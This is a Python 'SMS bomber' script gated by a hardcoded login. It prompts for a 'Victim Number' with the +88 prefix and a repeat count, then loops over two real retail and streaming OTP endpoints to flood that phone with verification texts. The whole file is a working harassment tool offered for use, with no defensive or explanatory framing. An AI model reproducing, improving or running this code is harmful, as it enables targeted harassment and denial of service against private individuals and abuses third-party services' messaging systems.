import os,sys,time,datetime
import requests
bl="\33[94m"
re="\033[91m"
li="\033[94m"
w="\33[97m"
y="\33[93m"
g="\033[1;32m"
cy="\033[96m"
end="\033[0m"



os.system('clear')
info=""" ===========================================
           [•]Created by Mr Ruman Yt
           [•] Help to creat THZ Admin(mao&Noob)
           [•]Thank you THZ group Admin
  ==================================================
"""
os.system("lolcat 002.txt")
print(g+info)

a='ThZBd'
b='THZbd'

c=str(input(y+"Enter Username: "))
print("  ")
d=str(input(y+"Enter Password: "))

if a==c and b==d:
  print(g+"Successfully login [√]")
  time.sleep(2)
  os.system('clear')
  
  pass 

else:
  print(re+"[×] Wrong Username or Password try agin ")
  sys.exit()

 

logo="""
|  __ \                              / ____|  \/  |/ ____| 
 | |__) |   _ _ __ ___   __ _ _ __   | (___ | \  / | (___   
 |  _  / | | | '_ ` _ \ / _` | '_ \   \___ \| |\/| |\___ \  
 | | \ \ |_| | | | | | | (_| | | | |  ____) | |  | |____) | 
 |_|  \_\__,_|_| |_| |_|\__,_|_| |_| |_____/|_|  |_|_____/  
                                                            
                                                        
   
  [][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]                                                      
"""
print(cy+logo)

print(w+"["+re+" 1."+w+"]"+g+"START BOMBING  ")
print(g)
print(w+"["+re+" 2."+w+"]"+w+"E"+g+"X"+re+"I"+cy+"T")

inp=str(input("Enter choice: "))
if inp=='1':
  time.sleep(2)
  
  number=str(input(g+"Enter Victim Number"+cy+"(without"+w+" +88  ) :"))
  
  how=int(input(g+"        Enter amount: "))
  pass
  
api="https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+number+"&countryPhoneCode=%2B88"
url="https://ss.binge.buzz/otp/send/login"

data={'phone':number}
  
for i in range(how):
  requests.get(api)
  requests.post(url,data=data)
  
  print(str(i+1)+" Send Successfully[√]")
  
  



